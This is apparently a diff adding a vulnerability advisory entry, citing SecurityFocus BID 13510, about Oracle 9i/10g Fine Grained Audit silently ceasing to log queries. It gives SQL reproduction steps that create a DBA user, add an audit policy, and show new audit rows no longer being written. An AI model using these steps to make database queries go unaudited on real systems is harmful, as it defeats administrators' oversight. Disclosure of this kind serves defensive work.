@@ -1,0 +1,44 @@
+source: http://www.securityfocus.com/bid/13510/info
+
+Oracle 9i/10g Database is prone to a logging failure vulnerability that exists in Fine Grained Audit (FGA) functionality.
+
+Reports indicate that FGA may be disabled inadvertently, without notifying the database administrator. This results in FGA failing to log queries subsequent to the logging failure, this occurs for all database users and may result in a false sense of security. 
+
+The following steps to reproduce are available:
+
+1. Create user and objects and add policy.
+connect /as sysdba
+grant dba to fga identified by fga;
+conn fga/fga
+create table emp as select * from scott.emp;
+execute dbms_fga.add_policy(object_schema=>'FGA',
+object_name=>'EMP',policy_name=>'FGA_POLICY');
+
+2. Run SQL from fga user
+conn fga/fga
+select count(*) from fga.emp;
+select sql_text,to_char(timestamp,'HH24:MI:SS') time
+from sys.dba_fga_audit_trail;
+
+--> It will return 1 row.
+
+3. Run SQL from SYS user
+conn /as sysdba
+select count(*) from fga.emp;
+select sql_text,to_char(timestamp,'HH24:MI:SS') time
+from sys.dba_fga_audit_trail;
+
+--> It will return 1 row which was obtained by step 2.
+
+A new row was not inserted.
+
+4. Run SQL from fga user again
+
+conn fga/fga
+select count(*) from fga.emp;
+select sql_text,to_char(timestamp,'HH24:MI:SS') time
+from sys.dba_fga_audit_trail;
+
+--> It will return 1 row which was obtained by step 2.
+
+A new row was not inserted again. 
